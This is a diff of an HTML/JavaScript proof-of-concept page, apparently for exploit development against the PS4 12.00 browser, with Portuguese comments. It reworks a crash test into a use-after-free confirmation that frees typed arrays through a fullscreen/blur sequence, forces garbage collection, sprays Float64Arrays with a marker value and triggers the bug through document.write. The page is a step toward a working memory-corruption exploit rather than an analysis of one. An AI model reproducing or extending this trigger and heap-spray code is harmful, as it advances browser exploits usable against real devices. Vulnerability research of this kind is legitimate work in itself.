@@ -1,23 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>PS4 FullScreen+Blur Crash - Test arr=null</title>
+<meta charset="UTF-8">
+<title>PS4 UAF Confirmation</title>
 </head>
 <body>
 
-<h1>PS4 12.00 - Crash Isolation (arr=null test)</h1>
+<h2>PS4 12.00 - UAF Confirmation</h2>
 
-<button onclick="runCrashTest1()">Run Crash</button>
-<div id="result1"></div>   
+<button onclick="runTest(0)">1. Baseline</button>
+<button onclick="runTest(1)">2. Keep Alive (No GC)</button>
+<button onclick="runTest(2)">3. Force GC</button>
+
+<div id="log"></div>
 
 <script>
 const PATTERN = 2.121995791e-314;
 
-function runCrashTest1() {
-    const result = document.getElementById('result1');
-    result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
-    
+let globalKeepAlive = null;
+
+function runTest(mode) {
+    const log = document.getElementById("log");
+    log.innerHTML = "<p>Running... Press OPTIONS</p>";
+
     let controllers = [];
 
     // Passo 1 (inalterado)
@@ -26,55 +31,52 @@ function runCrashTest1() {
         arr[0] = i;
         controllers.push(arr);
     }
-    
-    // Passo 2 (inalterado)
-    const elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-    
-    // Passo 3 (inalterado)
-    window.onblur = function() {
-        result.innerHTML += '<p>onblur triggered</p>';
-        
-        // 🔴 TESTE: remover referências aos TypedArrays
-        result.innerHTML += '<p>Nullificando referências...</p>';
-        controllers = null;
 
-        // (opcional leve GC pressure sem alterar muito timing)
-        for (let i = 0; i < 1000; i++) {
-            new ArrayBuffer(0x1000);
+    // 🔴 Controle de retenção
+    if (mode === 1) {
+        // KEEP ALIVE → impede GC
+        globalKeepAlive = controllers;
+    }
+
+    // Fullscreen (inalterado)
+    document.documentElement.webkitRequestFullscreen?.();
+
+    window.onblur = function() {
+
+        if (mode === 2) {
+            // 🔥 FORÇA GC
+            controllers = null;
+
+            for (let i = 0; i < 20000; i++) {
+                new ArrayBuffer(0x10000);
+            }
         }
 
-        // Passo 4 (spray mantido)
+        if (mode === 0) {
+            // Baseline (inalterado)
+        }
+
+        if (mode === 1) {
+            // KEEP ALIVE → NÃO liberar
+        }
+
+        // Spray mantido
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
             p.fill(PATTERN);
             spray.push(p);
         }
-        
-        // Passo 5 (mantido, mas pode não encontrar nada agora)
-        let corrupted = null;
-        if (controllers) {
-            for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] === PATTERN) {
-                    corrupted = controllers[i];
-                    break;
-                }
-            }
-        }
 
-        result.innerHTML += '<p>Seguindo para document.write...</p>';
-
-        // Passo 6 (INALTERADO - CRÍTICO)
+        // Gatilho crítico (inalterado)
         setTimeout(() => {
             document.open();
-            document.write('<html><body><h1>Crash</h1></body></html>');
+            document.write("<h1>Crash</h1>");
             document.close();
             setTimeout(() => location.reload(), 500);
         }, 3000);
     };
 }
-
 </script>
 
 </body>
